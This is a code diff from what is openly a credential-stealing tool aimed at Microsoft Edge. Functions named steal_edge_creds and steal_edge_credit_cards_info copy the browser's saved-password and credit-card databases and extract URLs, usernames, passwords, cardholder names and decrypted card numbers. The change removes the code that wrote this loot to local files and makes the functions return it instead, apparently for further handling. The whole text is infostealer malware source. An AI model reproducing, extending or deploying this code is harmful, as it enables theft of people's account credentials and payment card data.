@@ -94,35 +94,16 @@ def __get_edge_credit_cards(cur):
     return credit_cards
 
 
-def __write_edge_creds(edge_creds):
-    with open(__EDGE_CREDS_COPY_FILE, "w+") as f: # send edge data to bak file
-        for record in edge_creds:
-            try:
-                f.write(f"{record['origin_url']}, {record['username']}, {record['password']}\n")
-            except Exception as e:
-                continue
-
-
-def __write_edge_credit_cards(edge_credit_cards):
-    with open(__EDGE_CREDIT_CARDS_COPY_FILE, "w+") as f: # send edge data to bak file
-        for record in edge_credit_cards:
-            try:
-                f.write(f"{record['name_on_card']}, {record['expiration_month']}, {record['expiration_year']}, {record['card_number_decrypted']}\n")
-            except Exception as e:
-                continue
-
-
 def steal_edge_creds(): # get edge credentials
     __copy_db_file(__EDGE_CREDS_ORIGINAL_FILE, __EDGE_CREDS_COPY_FILE)
     con, cur = __open_db_connection(__EDGE_CREDS_COPY_FILE)
     edge_creds = __get_edge_creds(cur)
     con.close() # Close SQLite3 connection
-    __write_edge_creds(edge_creds)
-
+    return edge_creds
 
 def steal_edge_credit_cards_info(): # get edge credit cards
     __copy_db_file(__EDGE_CREDIT_CARDS_FILE, __EDGE_CREDIT_CARDS_COPY_FILE)
     con, cur = __open_db_connection(__EDGE_CREDIT_CARDS_COPY_FILE)
     credit_cards = __get_edge_credit_cards(cur)
     con.close() # Close SQLite3 connection
-    __write_edge_credit_cards(credit_cards)
+    return credit_cards
